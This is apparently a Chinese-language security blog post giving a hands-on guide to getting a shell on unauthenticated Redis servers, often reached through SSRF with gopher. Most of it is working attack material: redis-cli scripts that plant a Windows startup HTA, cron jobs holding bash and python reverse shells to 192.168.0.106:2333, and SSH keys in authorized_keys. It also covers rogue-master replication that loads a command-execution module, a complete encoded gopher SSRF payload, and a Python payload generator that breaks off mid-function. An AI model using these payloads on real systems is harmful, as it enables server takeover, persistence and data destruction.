---
title: redis getshell实战
toc: true
categories: hack_middleware
tags: redis
abbrlink: eb21dee
date: 2020-07-24 22:02:00
---

ssrf会造成内网漫游，redis作为一种内网常用的中间件易受到攻击，本文主要实践了redis未授权下的攻击和利用，主要从写文件和主从复制RCE两个方面进行了阐述，期间遇到了一些坑，记录下来以飨众人。
<!-- more -->

## 写文件

写文件这个功能其实就是通过修改redis的dbfilename、dir配置项，通常来说掌控了写文件也就完成了rce的一半，这几种写文件来getshell的方式也是最有效最简单的。

### Windows

#### 开机自启动

在Windows 系统中有一个特殊的目录叫自启动目录，在这个目录下的文件在开机的时候都会被运行。

```text
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\redis_rce.hta
```

笔者把下面这段JScript执行`calc`命令的代码写到了该目录下，

```
<SCRIPT Language="JScript">new ActiveXObject("WScript.Shell").run("calc.exe");</SCRIPT>
```

我们在win测试机上搭建一个有ssrf的漏洞，利用gopher协议发送redis协议流量，我们在Linux上使用socat捕获redis协议流量，windows_startup.sh内容如下，

```shell
echo -e '\n\n<SCRIPT Language="JScript">new ActiveXObject("WScript.Shell").run("calc.exe");</SCRIPT>\n\n'|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir 'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp'  # 指定本地数据库存放目录
redis-cli -h $1 -p $2 config set dbfilename redis_rce.hta  # 指定本地数据库文件名，默认值为dump.rdb
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit
```

`config set dir`后面的路径要加引号，否则会报错，加引号之后的报错可以忽略，因为Linux上面没有这个路径。

```shell
127.0.0.1:6379> config set dir C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp
(error) ERR Wrong number of arguments for CONFIG set
127.0.0.1:6379> config set dir 'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp'
(error) ERR Changing directory: No such file or directory
```

在转换流量的时候要把下面的报错信息去掉，

```
< 2020/07/23 16:00:40.500366  length=52 from=0 to=51
-ERR Changing directory: No such file or directory\r
```

得到gopher协议payload，

```shell
# xiaopo @ fht in ~/python/POC/ssrf [16:08:46] 
$ python tran2gopher.py socat_windows_startup.log
*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$92%0d%0a%0a%0a<SCRIPT Language="JScript">new ActiveXObject("WScript.Shell").run("calc.exe");</SCRIPT>%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$60%0d%0aC:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$13%0d%0aredis_rce.hta%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```

然后还需对上面内容的特殊字符进行url编码，比如%，因为ssrf利用经过了两个协议（先http后gopher），最终payload触发，
![/data/typora_assets/redis/image-20200723164207035.png](https://i.loli.net/2020/07/24/TqmCQrOR6ZE8gVh.png)

### Linux

以下三种利用方式都需要有写文件权限（这不废话），需要redis以root权限运行。
redis原始信息

```shell
[root@localhost redis]# redis-cli 
127.0.0.1:6379> config get dir
1) "dir"
2) "/var/lib/redis"
127.0.0.1:6379> config get dbfilename
1) "dbfilename"
2) "dump.rdb"
127.0.0.1:6379> get 1
"\n\n12345\n"
```

#### crontab

定时任务目录
```shell
centos:
/var/spool/cron/root # centos系统下root用户的cron文件，实际测试成功。
/etc/crontab # 该位置的payload需要加root，实际测试成功。
/etc/cron.d/* # 将利用这个目录，可以做到不覆盖任何其他文件的情况进行反弹shell，实际测试成功。

ubuntu：
/var/spool/cron/crontabs/root # debian系统下root用户的cron文件，实际测试不能成功反弹shell。
/etc/crontab # 该位置的payload需要加root，实际测试不能成功反弹shell。
/etc/cron.d/* # 利用这个目录，可以做到不覆盖任何其他文件的情况进行反弹shell，实际测试不能成功反弹shell。
```
getshell_crontab.sh内容如下，
```shell
echo -e "\n\n* * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\n\n"|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/  # 指定本地数据库存放目录
redis-cli -h $1 -p $2 config set dbfilename root  # 指定本地数据库文件名，默认值为dump.rdb
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit
```
注意：有些系统对 crontab 的文件内容的校验比较严格可能会导致无法执行定时任务，以上代码在centos7下测试成功，
```shell
[root@localhost redis]# bash getshell_crontab.sh 127.0.0.1 6379
OK
OK
OK
OK
OK

127.0.0.1:6379> get 1
"\n\n* * * * * bash -i >& /dev/tcp/192.168.0.106/2333 0>&1\n\n\n"
127.0.0.1:6379> config get dir
1) "dir"
2) "/var/spool/cron"
127.0.0.1:6379> config get dbfilename
1) "dbfilename"
2) "root"
```
写入文件`/var/spool/cron/root`内容如下，

```
REDIS0007ú      redis-ver^F3.2.12ú
redis-bitsÀ@ú^EctimeÂ±C^C_ú^Hused-memÂøf^L^@þ^@û^A^@^@À^A:

* * * * * bash -i >& /dev/tcp/192.168.0.106/2333 0>&1


ÿ<91>Å  <87>7^X´g
```
在Linux Mint19.3也就是Ubuntu 18.04 LTS上面测试多个目录均无法成功save，
```shell
root@mint-VirtualBox:/data/hack/B/middleware/redis# bash getshell_crontab.sh 127.0.0.1 6379
OK
OK
OK
(error) ERR
OK
```
查看redis运行权限发现是redis用户，
```shell
mint@mint-VirtualBox:~$ ps -ef | grep redis
redis     1750     1  0 23:22 ?        00:00:00 /usr/bin/redis-server 127.0.0.1:6379
mint      1755  1682  0 23:22 pts/0    00:00:00 grep --color=auto red
```
同时从redis配置文件中找到redis log位置，然后查看日志，发现主要原因是只读权限，
```
2958:M 17 Jul 16:55:31.014 * 1 changes in 900 seconds. Saving...
2958:M 17 Jul 16:55:31.014 * Background saving started by pid 4151
4151:C 17 Jul 16:55:31.015 # Failed opening the RDB file dump.rdb (in server root dir /var/spool/cron) for saving: Read-only file system
2958:M 17 Jul 16:55:31.115 # Background saving error
2958:M 17 Jul 16:55:37.103 * 1 changes in 900 seconds. Saving...
2958:M 17 Jul 16:55:37.104 * Background saving started by pid 4152
4152:C 17 Jul 16:55:37.105 # Failed opening the RDB file dump.rdb (in server root dir /var/spool/cron) for saving: Read-only file system
2958:M 17 Jul 16:55:37.204 # Background saving error
```
停止redis服务，然后sudo运行，查看为root运行权限，
```shell
mint@mint-VirtualBox:~$ service redis stop
mint@mint-VirtualBox:~$ ps -ef | grep redis
mint      1922  1682  0 23:30 pts/0    00:00:00 grep --color=auto redis
mint@mint-VirtualBox:~$ sudo /usr/bin/redis-server 
1978:C 17 Jul 23:35:34.339 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
1978:C 17 Jul 23:35:34.339 # Redis version=4.0.9, bits=64, commit=00000000, modified=0, pid=1978, just started
1978:C 17 Jul 23:35:34.339 # Warning: no config file specified, using the default config. In order to specify a config file use /usr/bin/redis-server /path/to/redis.conf
1978:M 17 Jul 23:35:34.340 * Increased maximum number of open files to 10032 (it was originally set to 1024).
mint@mint-VirtualBox:~$ ps -ef | grep redis
root      1977  1682  0 23:35 pts/0    00:00:00 sudo /usr/bin/redis-server
root      1978  1977  0 23:35 pts/0    00:00:00 /usr/bin/redis-server *:6379
mint      1996  1985  0 23:35 pts/1    00:00:00 grep --color=auto redis
```
再次运行利用脚本，成功写入`/var/spool/cron/crontabs/root`，
```shell
REDIS0008ú      redis-ver^E4.0.9ú
redis-bitsÀ@ú^EctimeÂvÆ^Q_ú^Hused-memÂÈ#^M^@ú^Laof-preambleÀ^@þ^@û^A^@^@À^A:

* * * * * bash -i >& /dev/tcp/192.168.0.106/2333 0>&1


ÿ<9c>^TL¶d¦ª
```
奇怪的是，即使成功写入，也并未触发反弹shell，重启cron服务无效
```shell
sudo service cron status
```
查看cron log日志，发现没有开启，找到rsyslog日志中cron部分，去掉前面的#号，重启rsyslog
```shell
mint@mint-VirtualBox:~$ less -10 /var/log/cron.log
/var/log/cron.log: No such file or directory
mint@mint-VirtualBox:~$ sudo vim /etc/rsyslog.d/50-default.conf
mint@mint-VirtualBox:~$ sudo service rsyslog restart
```
cron log日志如下，
```shell
int@mint-VirtualBox:~$ tail -f /var/log/cron.log
Jul 18 18:33:05 mint-VirtualBox crontab[2035]: (root) LIST (root)
Jul 18 18:34:02 mint-VirtualBox cron[573]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
```
网上搜索必须"chmod 600"才行，默认的情况好像是644？
```shell
mint@mint-VirtualBox:~$ sudo ls -l /var/spool/cron/crontabs/
total 4
-rw-r--r-- 1 root root 54 Jul 18 17:36 root
mint@mint-VirtualBox:~$ sudo chmod 600 /var/spool/cron/crontabs/root
mint@mint-VirtualBox:~$ sudo ls -l /var/spool/cron/crontabs/
total 4
-rw------- 1 root root 54 Jul 18 17:36 root
mint@mint-VirtualBox:~$ sudo service cron restart
```
然后继续观察日志，
```shell
Jul 18 19:17:01 mint-VirtualBox CRON[2759]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
Jul 18 19:26:01 mint-VirtualBox cron[2173]: (root) RELOAD (crontabs/root)
Jul 18 19:26:01 mint-VirtualBox cron[2173]: Error: bad minute; while reading crontab for user root
Jul 18 19:26:01 mint-VirtualBox cron[2173]: (root) ERROR (Syntax error, this crontab file will be ignored)
Jul 18 19:27:09 mint-VirtualBox crontab[2843]: (root) LIST (root)
```
据上面日志猜测可能是由于crontab文件格式的问题，我们尝试把`/var/spool/cron/crontabs/root`文件内容改成一条反弹shell的任务，即 
```shell
root@mint-VirtualBox:/data/hack/C/middleware/redis# cat /var/spool/cron/crontabs/root 
* * * * * bash -i >& /dev/tcp/192.168.0.106/2333 0>&1
```
相关日志，
```shell
Jul 18 19:30:01 mint-VirtualBox cron[2173]: (root) RELOAD (crontabs/root)
Jul 18 19:30:01 mint-VirtualBox CRON[2869]: (root) CMD (bash -i >& /dev/tcp/192.168.0.106/2333 0>&1)
Jul 18 19:30:01 mint-VirtualBox CRON[2868]: (CRON) info (No MTA installed, discarding output)
Jul 18 19:31:01 mint-VirtualBox CRON[2881]: (root) CMD (bash -i >& /dev/tcp/192.168.0.106/2333 0>&1)
Jul 18 19:31:01 mint-VirtualBox CRON[2880]: (CRON) info (No MTA installed, discarding output)
```
"No MTA installed, discarding output"网上有很多解法，解法1是安装邮件服务器；解法2是把shell命令放到一个文件中，执行该文件，然后重定向到null文件。官方解法见链接https://cronitor.io/cron-reference/no-mta-installed-discarding-output

值得注意的是，官方里面说这个错误不会影响任务本身的执行，但是为什么依然没有反弹shell呢，我们试着用其中一种解法`MAILTO=""`来解决该错误，然后观察日志，

```shell
Jul 18 19:38:01 mint-VirtualBox cron[2173]: (root) RELOAD (crontabs/root)
Jul 18 19:38:01 mint-VirtualBox CRON[2964]: (root) CMD (bash -i >& /dev/tcp/192.168.0.106/2333 0>&1)
Jul 18 19:38:20 mint-VirtualBox crontab[2967]: (root) LIST (root)
Jul 18 19:39:01 mint-VirtualBox CRON[2975]: (root) CMD (bash -i >& /dev/tcp/192.168.0.106/2333 0>&1)
```
果然没再报错，但是依旧没有反弹shell，是不是反弹shell命令写错了？我们尝试直接执行是没有问题的，
![/data/typora_assets/redis/20200718194424795.png](https://i.loli.net/2020/07/24/BLlkCrbD8aujJvV.png)
后来发现这篇文章，https://www.onebug.org/websafe/98675.html 里面提到“bash -i反弹shell都失败，不过python，perl可以”，换成python的试一下，确实可以，
![/data/typora_assets/redis/20200718200550210.png](https://i.loli.net/2020/07/24/YViLD2kGw1CsZoA.png)
我们使用python反弹shell试一下ubuntu是否真的会受格式影响，

```shell
echo -e "\n\n* * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/crontabs/  # 指定本地数据库存放目录
redis-cli -h $1 -p $2 config set dbfilename root  # 指定本地数据库文件名，默认值为dump.rdb
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit

127.0.0.1:6379> get 1
"\n\n* * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\
```
但是写入到`/var/spool/cron/crontabs/root`文件的比较怪，
```
EDIS0008ú      redis-ver^E4.0.9ú
redis-bitsÀ@ú^EctimeÂ}æ^R_ú^Hused-memÂ¨Ó^L^@ú^Laof-preambleÀ^@þ^@û^A^@^@À^AÃ@Á@ù^C

* À^A^_/usr/bin/python -c 'import socke^Qt,subprocess,os;s=<80>^V^@.<80>^F^@(<80>^F^H.AF_INET, ^N^]SOCK_STREAM);s.connect(("127.0 ^A^_1",2333));os.dup2(s.fileno(),0);^@ à
^V^@1à^M^V^D2);p=à^A¤^G.call(["`Ô^Nsh","-i"]);'


ÿáÍëÝîÇpá
```
16进制查看，
![/data/typora_assets/redis/20200718214546791.png](https://i.loli.net/2020/07/24/Vzei6OFRBC8aSGX.png)
按照https://lorexxar.cn/2016/12/03/redis-getshell/ 这篇文章所讲好像发生了截断？但是具体怎么个截断法，没搞明白，是否可能构造出完美payload有待研究？如果写入字符比较少就不会发生截断，例如，
![/data/typora_assets/redis/20200718220052178.png](https://i.loli.net/2020/07/24/3TlSW2YkRxQreUf.png)
最后我们尝试一下，如果不发生截断的情况下写到`/var/spool/cron/crontabs/root`文件，能否反弹shell，我们手动更改`/var/spool/cron/crontabs/root`文件内容如下，

```shell
REDIS0008ú      redis-ver^E4.0.9ú
redis-bitsÀ@ú^EctimeÂ^G^@^S_ú^Hused-memÂè!^M^@ú^Laof-preambleÀ^@þ^@û^A^@^@À^AÃ@Á@ù^C

* * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.106",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


ÿ¸l<8e>Ø^Z<9c><90>
```
最后发现是不行的，cron log报时间格式错误、语法错误，
![/data/typora_assets/redis/20200718221117435.png](https://i.loli.net/2020/07/24/wWsuCKPoB5YF3vj.png)
总结：

- centos下可以成功写crontab反弹shell。
- ubuntu下无法写crontab反弹shell，主要原因在于ubuntu对于crontab格式要求比较严格，不允许有语法出错，而redis在写入的时候，在前、后都会附加redis的一些信息；另外就是ubuntu下利用crontab使用bash反弹shell是无法成功的，原因是执行 crontab 使用的是 `/bin/sh` , 而ubuntu下` /bin/sh` 软连接的是dash ，而不是 bash，那么如果你直接在 cron 里面写 bash - i xx 的反弹是不可能成功的，解决方法有三种，一种是改写为`bash -c "bash -i  >&/dev/tcp/192.168.0.106/2333 0>&1"`，另一种就是使用 python 调用 `/bin/sh` 反弹 shell ，还有一种可以尝试写 bash 文件，然后用 crontab 去执行。比如/tmp/test.sh
    ```shell
    #!/bin/bash
    /bin/bash -i >& /dev/tcp/192.168.0.106/2333 0>&1
    ```
注意此处为`#!/bin/bash`而非`#!/bin/sh`，然后为test.sh加上执行权限`chmod +x /tmp/test.sh`，之后任务计划里的内容修改为`* * * * * /tmp/test.sh`。
利用python可以成功反弹shell，但是python反弹shell的payload比较长，利用redis写到crontab文件的时候会发生莫名的payload截断；最后就是ubuntu用户定时任务必须在600权限才能执行，否则提示INSECURE MODE不予执行。

#### webshell

需要知道web目录

#### ssh key

```shell
# xiaopo @ fht in ~ [22:20:29] C:130
$ cat ~/.ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOVgEY/clVIFD7U/pbZly0jW5PJs6BV8gG6hKvQT3FjQUpMNADHy/MgjIoeBQpCLSRv5fOHSLVdxFgTe8qgX6s8wR1JlLPCgRPAfr8LbpxQcuw5zVqbA9DsYxEf+6Qry+SeZWXOB8tHWSZBMK7BX09g1y/hTEsrd1d/VoPBci8kUsuybqnaoRGz8p4YaJFl+jiI5SIcTb/mJTcyPOK0hFCDL7ylSJLXn/BaT5E8dPuZzj+Oha+k8PabEf0V22Jmt7gDL7e7Omit277liorsNARBH4LccPk9T9cOdmlxMswjEA3+Xbb6f3kgYaxEg6SHEWkSvMyt+x3NM6R76q5H8Nx xiaopo@fht
```
sshkey.sh内容如下，
```shell
echo -e "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOVgEY/clVIFD7U/pbZly0jW5PJs6BV8gG6hKvQT3FjQUpMNADHy/MgjIoeBQpCLSRv5fOHSLVdxFgTe8qgX6s8wR1JlLPCgRPAfr8LbpxQcuw5zVqbA9DsYxEf+6Qry+SeZWXOB8tHWSZBMK7BX09g1y/hTEsrd1d/VoPBci8kUsuybqnaoRGz8p4YaJFl+jiI5SIcTb/mJTcyPOK0hFCDL7ylSJLXn/BaT5E8dPuZzj+Oha+k8PabEf0V22Jmt7gDL7e7Omit277liorsNARBH4LccPk9T9cOdmlxMswjEA3+Xbb6f3kgYaxEg6SHEWkSvMyt+x3NM6R76q5H8Nx xiaopo@fht\n\n"|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /root/.ssh/   # 指定本地数据库存放目录
redis-cli -h $1 -p $2 config set dbfilename authorized_keys  # 指定本地数据库文件名，默认值为dump.rdb
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit
```
以上代码在centos7测试并连接成功，当然前提需要有/root/.ssh/这个目录，

```shell
[root@localhost redis]# mkdir -p /root/.ssh/
[root@localhost redis]# bash sshkey.sh 127.0.0.1 6379
OK
OK
OK
OK
OK
[root@localhost redis]# redis-cli
127.0.0.1:6379> get 1
"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOVgEY/clVIFD7U/pbZly0jW5PJs6BV8gG6hKvQT3FjQUpMNADHy/MgjIoeBQpCLSRv5fOHSLVdxFgTe8qgX6s8wR1JlLPCgRPAfr8LbpxQcuw5zVqbA9DsYxEf+6Qry+SeZWXOB8tHWSZBMK7BX09g1y/hTEsrd1d/VoPBci8kUsuybqnaoRGz8p4YaJFl+jiI5SIcTb/mJTcyPOK0hFCDL7ylSJLXn/BaT5E8dPuZzj+Oha+k8PabEf0V22Jmt7gDL7e7Omit277liorsNARBH4LccPk9T9cOdmlxMswjEA3+Xbb6f3kgYaxEg6SHEWkSvMyt+x3NM6R76q5H8Nx xiaopo@fht\n\n\n"
127.0.0.1:6379> exit
[root@localhost redis]# cat /root/.ssh/authorized_keys 
REDIS0007�	redis-ver3.2.12�
redis-bits�@�ctime²�_used-memh
                                ���A�

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOVgEY/clVIFD7U/pbZly0jW5PJs6BV8gG6hKvQT3FjQUpMNADHy/MgjIoeBQpCLSRv5fOHSLVdxFgTe8qgX6s8wR1JlLPCgRPAfr8LbpxQcuw5zVqbA9DsYxEf+6Qry+SeZWXOB8tHWSZBMK7BX09g1y/hTEsrd1d/VoPBci8kUsuybqnaoRGz8p4YaJFl+jiI5SIcTb/mJTcyPOK0hFCDL7ylSJLXn/BaT5E8dPuZzj+Oha+k8PabEf0V22Jmt7gDL7e7Omit277liorsNARBH4LccPk9T9cOdmlxMswjEA3+Xbb6f3kgYaxEg6SHEWkSvMyt+x3NM6R76q5H8Nx xiaopo@fht


�B�I$��:[root@localhost redis]# 
```
在Mint下写入并连接成功，
```shell
root@mint-VirtualBox:/data/hack/C/middleware/redis# cat /root/.ssh/authorized_keys 
REDIS0008�	redis-ver4.0.9�
redis-bits�@�ctime�Z
�                   _used-mem�$
 aof-preamble����A�

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOVgEY/clVIFD7U/pbZly0jW5PJs6BV8gG6hKvQT3FjQUpMNADHy/MgjIoeBQpCLSRv5fOHSLVdxFgTe8qgX6s8wR1JlLPCgRPAfr8LbpxQcuw5zVqbA9DsYxEf+6Qry+SeZWXOB8tHWSZBMK7BX09g1y/hTEsrd1d/VoPBci8kUsuybqnaoRGz8p4YaJFl+jiI5SIcTb/mJTcyPOK0hFCDL7ylSJLXn/BaT5E8dPuZzj+Oha+k8PabEf0V22Jmt7gDL7e7Omit277liorsNARBH4LccPk9T9cOdmlxMswjEA3+Xbb6f3kgYaxEg6SHEWkSvMyt+x3NM6R76q5H8Nx xiaopo@fht


�a��/ԡOroot@mint-VirtualBox:/data/hack/C/middleware/redis#
```

## 反序列化

待补充

## 主从复制RCE

### 原理

前言：比起以前的利用方式来说，这种利用方式更为通用，危害也更大，因为随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了。

redis主从复制：Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。可以通过下来理解，其中`slaveof 172.17.0.2`就是将`172.17.0.2`设置为自己的主节点，主机数据会同步到每个从节点。

```shell
# xiaopo @ fht in ~ [23:34:45] 
$ docker inspect --format='{{.NetworkSettings.IPAddress}}' $(docker ps -a -q)
172.17.0.2
172.17.0.3

# xiaopo @ fht in ~ [23:34:46] 
$ redis-cli -h 172.17.0.3 -p 6379                                            
172.17.0.3:6379> slaveof 172.17.0.2 6379
OK
172.17.0.3:6379> get b
(nil)
172.17.0.3:6379> exit

# xiaopo @ fht in ~ [23:35:14] 
$ redis-cli -h 172.17.0.2 -p 6379
172.17.0.2:6379> get b
(nil)
172.17.0.2:6379> set b 1
OK
172.17.0.2:6379> exit

# xiaopo @ fht in ~ [23:35:22] 
$ redis-cli -h 172.17.0.3 -p 6379
172.17.0.3:6379> get b
"1"
172.17.0.3:6379> 
```

redis主从数据库之间的同步分为两种，全量复制和部分复制，全量复制是将数据库备份文件整个传输过去，然后从节点清空内存数据库，将备份文件加载到数据库中。而部分复制只是将写命令发送给从节点。所以**务必注意此方法会清空目标数据库**。

redis模块：在Reids 4.x之后，Redis新增了模块功能，通过外部扩展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。比如写一个可以执行系统命令的扩展：
```shell
# xiaopo @ fht in ~ [23:40:02] 
$ redis-cli
127.0.0.1:6379> module load /home/xiaopo/python/POC/redis/redis-rce/exp.so
OK
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> 
```

受影响版本：<=5.0.5

原始paper：

https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
主要利用方法如下：
![/data/typora_assets/redis/20200719220535985.png](https://i.loli.net/2020/07/24/mHsyYI4wLjpgfNh.png)
第一步，我们伪装一个redis数据库，然后目标redis将我们的redis数据库设置为主节点。
第二步，我们获得目标redis dbfilename的值，或设置目标redis的dbfilename为so文件
第三步，设置传输方式为全量传输，并将已编译为.so文件的攻击扩展作为payload发送。
第四步，在目标客户机加载dbfilename文件，成功加载扩展，扩展里面实现了任意命令执行。

### 利用方法

利用条件：必需一个外网IP模拟redis rogue server，且内网redis能出外网。

现在网上大部分的利用方法都是攻击外网未授权redis，比如已有的exp：

https://github.com/Ridter/redis-rce

对于攻击内网未授权redis，比如利用ssrf gopher协议，是需要在外网模拟redis rogue server，内网构造payload发送的。笔者实际演示一下，

先使用socat抓到实际协议流量
`socat -v tcp-listen:4444,fork tcp-connect:localhost:6379`

运行上面的exp，
`python3 redis-rce.py -r 127.0.0.1 -p 4444 -L 127.0.0.1 -P 2333 -f exp.so -v`
![/data/typora_assets/redis/20200719231846015.png](https://i.loli.net/2020/07/24/u4rA8xYUHeTRmnt.png)

注意上面的`FULLRESYNC`流量是master响应包（master在2333端口），响应slave数据库的`PSYNC`请求的（slave端口在6379），而我们抓包流量是4444->6379，所以下面是没有这个包的流量的。

此时目标redis已经加载了扩展，

```shell
127.0.0.1:6379> whoami
(error) ERR unknown command 'whoami'
127.0.0.1:6379> system.exec 'whoami'
"root\n"
```
但是我们想反弹shell，故继续往下转发流量
![/data/typora_assets/redis/20200720122441757.png](https://i.loli.net/2020/07/24/JalBETWkDe8Pm4z.png)

获得反弹到3000端口的shell，
![/data/typora_assets/redis/20200720122508087.png](https://i.loli.net/2020/07/24/l9xEjsLeHcCOvVS.png)

拷贝流量到socat.log，需要处理一下socat.log，把前面的INFO部分去掉，得到

```
> 2020/07/20 12:23:45.195249  length=42 from=14 to=55
*3\r
$7\r
SLAVEOF\r
$9\r
127.0.0.1\r
$4\r
2333\r
< 2020/07/20 12:23:45.195443  length=5 from=2716 to=2720
+OK\r
> 2020/07/20 12:23:45.195529  length=54 from=56 to=109
*4\r
$6\r
CONFIG\r
$3\r
SET\r
$10\r
dbfilename\r
$6\r
exp.so\r
< 2020/07/20 12:23:45.195646  length=5 from=2721 to=2725
+OK\r
> 2020/07/20 12:23:49.579654  length=40 from=110 to=149
*3\r
$6\r
MODULE\r
$4\r
LOAD\r
$8\r
./exp.so\r
< 2020/07/20 12:23:49.583106  length=5 from=2726 to=2730
+OK\r
> 2020/07/20 12:23:49.583585  length=34 from=150 to=183
*3\r
$7\r
SLAVEOF\r
$2\r
NO\r
$3\r
ONE\r
< 2020/07/20 12:23:49.584298  length=5 from=2731 to=2735
+OK\r
> 2020/07/20 12:23:57.257107  length=46 from=184 to=229
*3\r
$10\r
system.rev\r
$9\r
127.0.0.1\r
$4\r
3000\r
> 2020/07/20 12:23:57.300300  length=56 from=230 to=285
*4\r
$6\r
CONFIG\r
$3\r
SET\r
$10\r
dbfilename\r
$8\r
dump.rdb\r
> 2020/07/20 12:25:27.132319  length=80 from=286 to=365
*2\r
$11\r
system.exec\r
$11\r
rm ./exp.so\r
*3\r
$6\r
MODULE\r
$6\r
UNLOAD\r
$6\r
system\r
```
然后使用脚本`python3 tran2gopher.py socat.log `转换成gohper协议的，最后\r需要替换成%0d%0a
随后启动redis rogue server，`python3 redis-rogue-server.py --lport 2333 -f redis-rce/exp.so`，启动监听3000端口`$ nc -lvvp 3000`
先用curl模拟gopher协议测试是否正确，

![/data/typora_assets/redis/20200720123201391.png](https://i.loli.net/2020/07/24/zuyqRw4IQxMZ5hO.png)

然后利用ssrf漏洞测试也成功触发，记得要对gopher://协议进行特殊字符的url编码，比如%，因为这是经过了两个协议（先http后gopher）
```http
http://localhost/vuln/ssrf.php?test=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%247%250d%250aSLAVEOF%250d%250a%249%250d%250a127.0.0.1%250d%250a%244%250d%250a2333%250d%250a%2A4%250d%250a%246%250d%250aCONFIG%250d%250a%243%250d%250aSET%250d%250a%2410%250d%250adbfilename%250d%250a%246%250d%250aexp.so%250d%250a%2A3%250d%250a%246%250d%250aMODULE%250d%250a%244%250d%250aLOAD%250d%250a%248%250d%250a.%2Fexp.so%250d%250a%2A3%250d%250a%247%250d%250aSLAVEOF%250d%250a%242%250d%250aNO%250d%250a%243%250d%250aONE%250d%250a%2A3%250d%250a%2410%250d%250asystem.rev%250d%250a%249%250d%250a127.0.0.1%250d%250a%244%250d%250a3000%250d%250a%2A4%250d%250a%246%250d%250aCONFIG%250d%250a%243%250d%250aSET%250d%250a%2410%250d%250adbfilename%250d%250a%248%250d%250adump.rdb%250d%250a%2A2%250d%250a%2411%250d%250asystem.exec%250d%250a%2411%250d%250arm%20.%2Fexp.so%250d%250a%2A3%250d%250a%246%250d%250aMODULE%250d%250a%246%250d%250aUNLOAD%250d%250a%246%250d%250asystem%250d%250a
```

我们尝试一下不用redis rogue server，直接发包`FULLRESYNC`可不可以成功，首先要抓到`FULLRESYNC`流量，也就是redis master与redis slave通信流量，我们采用python程序进行生成，
```python
import binascii
from optparse import OptionParser

if __name__ == "__main__":
    parser = OptionParser()
    parser.add_option("-f", "--exp", dest="exp", type="string", help="Redis Module to load, default exp.so", default="exp.so", metavar="EXP_FILE")

    (options, args) = parser.parse_args()
    exp_filename = options.exp
    print("Load the payload: %s" % exp_filename)

    CRLF = "\r\n"
    gopher_resp = ''

    payload = open(exp_filename, "rb").read()
    fullresync_resp = "+FULLRESYNC " + "Z" * 40 + " 1" + CRLF
    fullresync_resp += "$" + str(len(payload)) + CRLF
    fullresync_resp = fullresync_resp.encode()
    fullresync_resp += payload + CRLF.encode()
    # for test, success
    # fullresync_resp = b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
    print(fullresync_resp)
    for i in fullresync_resp:
        if 48 <= i < 58 or 65 <= i < 91 or 97 <= i < 123:  # [0-9|A-Z|a-z]
            gopher_resp += binascii.unhexlify(hex(i)[2:]).decode()
        # urlencode
        elif 1 == len(hex(i)[2:]):
            gopher_resp += '%0' + hex(i)[2:]
        elif 2 == len(hex(i)[2:]):
